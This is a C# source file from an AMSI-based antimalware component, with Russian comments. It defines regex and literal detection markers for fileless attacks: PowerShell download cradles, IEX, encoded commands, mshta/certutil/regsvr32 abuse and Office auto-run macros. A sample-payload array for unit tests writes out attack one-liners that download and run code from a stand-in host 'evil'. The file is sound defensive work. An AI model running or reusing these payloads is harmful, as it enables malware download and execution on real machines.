namespace CatGuardian.Amsi.Core;

/// <summary>
/// Маркеры скрытого выполнения кода (Fileless): PowerShell, VBA/Office, JScript/VBScript.
///
/// ВАЖНО: маркеры должны детектить ПРИЗНАК ИСПОЛНЕНИЯ,
/// а не голое упоминание имени командлета/члена API. Windows PowerShell 5.1 при загрузке
/// СИСТЕМНЫХ модулей (Microsoft.PowerShell.Utility и др.) сканирует их манифесты через AMSI,
/// и те содержат строки 'Invoke-WebRequest', 'DownloadString', 'WebClient' и т.п. — литеральные
/// маркеры давали ложный DETECTED → блокировка легитимного модуля → fail-fast powershell.exe
/// (0xC0000409), т.е. фактическая «поломка PowerShell».
///
/// Поэтому HardPatterns — КОНТЕКСТНЫЕ регулярные выражения:
/// <list type="bullet">
/// <item>вызов метода .NET: <c>\.DownloadString\(</c>;</item>
/// <item>создание объекта: <c>New-Object ... WebClient</c>;</item>
/// <item>вызов командлета с аргументом: <c>Invoke-WebRequest -...</c> / <c>Invoke-Expression(</c>;</item>
/// <item>специфичные комбинации флагов: <c>-EncodedCommand</c>, <c>certutil -urlcache</c>, …</item>
/// </list>
/// Выражения НЕ содержат lookarounds/backreferences — обязательное условие
/// RegexOptions.NonBacktracking (.NET 7+), см. <see cref="SafeRegex"/>.
/// </summary>
public static class ThreatMarkers
{
    /// <summary>
    /// Жёсткие маркеры — контекстные regex (порядок синхронизирован с <see cref="SamplePayloads"/>).
    /// Любое совпадение в пределах первых 64 КБ (Regex) даёт детект.
    /// </summary>
    public static readonly string[] HardPatterns =
    {
        // Сетевые загрузчики (PowerShell / .NET) — только факт ВЫЗОВА.
        @"\.DownloadString\s*\(",                        // $wc.DownloadString('url')
        @"\.DownloadFile\s*\(",                          // $wc.DownloadFile('url','file')
        @"New-Object[^\r\n]{0,300}WebClient",            // New-Object Net.WebClient
        @"Invoke-WebRequest\s*[-(]",                     // Invoke-WebRequest -Uri / Invoke-WebRequest(
        // Инъекция и исполнение в памяти.
        // Формы: Invoke-Expression(...), Invoke-Expression -..., Invoke-Expression 'arg',
        // Invoke-Expression $arg. Закрывающая кавычка имени в манифесте модуля
        // ('Invoke-Expression') не подпадает: после кавычки идёт ',' или ')' — исключены.
        @"Invoke-Expression\s*(?:\(|-|['""][^'""\r\n,)\]}]|\$[\w:.\[\]]+)",
        @"IEX\s*\(",                                     // IEX('...')
        @"FromBase64String\s*\(",                        // [Convert]::FromBase64String('...')
        @"-EncodedCommand\b",                            // powershell -EncodedCommand ...
        // Векторы запуска через системные утилиты.
        @"mshta\s*(?:http|vbscript|javascript)",         // mshta http://... / mshta vbscript:...
        @"certutil[ \t]+-urlcache",                      // certutil -urlcache ...
        @"regsvr32[ \t]+/s",                             // regsvr32 /s /i:http://...
        @"Start-Process[ \t]+-WindowStyle[ \t]+Hidden",  // Start-Process -WindowStyle Hidden
        // COM-объекты скрытого выполнения (ProgID не встречаются в манифестах PS-модулей).
        "WScript.Shell",
        "ADODB.Stream",
        "Shell.Application",
        @"GetObject\(\s*[""']winmgmts:",                 // GetObject("winmgmts:\...")
        // Офисные макросы (VBA) — автозапуск при открытии документа.
        "AutoOpen",
        "Document_Open",
        "Workbook_Open",
    };

    /// <summary>
    /// Контекстные подстроки для сверхбыстрого IndexOf-сканирования хвоста (за пределами 64 КБ):
    /// фрагменты реального кода атаки, которых нет в манифестах модулей.
    /// </summary>
    public static readonly string[] HardLiterals =
    {
        ".DownloadString(",
        ".DownloadFile(",
        "New-Object",
        "Invoke-WebRequest -",
        "Invoke-Expression",
        "IEX(",
        "FromBase64String(",
        "-EncodedCommand",
        "certutil -urlcache",
        "regsvr32 /s",
        "Start-Process -WindowStyle Hidden",
        "WScript.Shell",
        "ADODB.Stream",
        "Shell.Application",
        "GetObject(\"winmgmts:",
        "AutoOpen",
        "Document_Open",
        "Workbook_Open",
        "mshta http",
        "mshta vbscript:",
        "mshta javascript:",
    };

    /// <summary>
    /// Примеры реальных атак, по одному на каждый <see cref="HardPatterns"/>
    /// (используются юнит-тестами и документируют семантику паттерна).
    /// </summary>
    public static readonly string[] SamplePayloads =
    {
        "(New-Object Net.WebClient).DownloadString('http://evil/x.ps1')",
        "$wc.DownloadFile('http://evil/x.exe','C:\\evil.exe')",
        "$c = New-Object Net.WebClient; $c.DownloadString('http://evil/x')",
        "Invoke-WebRequest -Uri http://evil/x.ps1 -OutFile x.ps1",
        "Invoke-Expression 'malicious'",
        "IEX('malicious')",
        "[Convert]::FromBase64String('VGVzdA==')",
        "powershell -EncodedCommand AHUAYgBlAGMAbwBtAGUAIAA=",
        "mshta http://evil/x.hta",
        "certutil -urlcache -split -f http://evil/x.exe C:\\evil.exe",
        "regsvr32 /s /u /i:http://evil/x.sct scrobj.dll",
        "Start-Process -WindowStyle Hidden -FilePath cmd.exe",
        "$o = New-Object -ComObject WScript.Shell",
        "$o = New-Object -ComObject ADODB.Stream",
        "$o = New-Object -ComObject Shell.Application",
        "GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Create(null)",
        "Sub AutoOpen()",
        "Private Sub Document_Open()",
        "Private Sub Workbook_Open()",
    };

    /// <summary>
    /// Мягкие маркеры: подозрительные, но сами по себе не решающие.
    /// Используются только для диагностики (метаданные совпадений в Trace), в вердикт НЕ входят —
    /// чтобы не порождать ложные срабатывания AMSI на легитимных скриптах.
    /// </summary>
    public static readonly string[] SoftMarkers =
    {
        "powershell",
        "wscript",
        "cscript",
        "rundll32",
        "base64",
        "http://",
        "https://",
        "eval(",
        "Start-Sleep",
        "SchTasks",
        "-WindowStyle",
        "CreateObject",
        "Exec(",
    };
}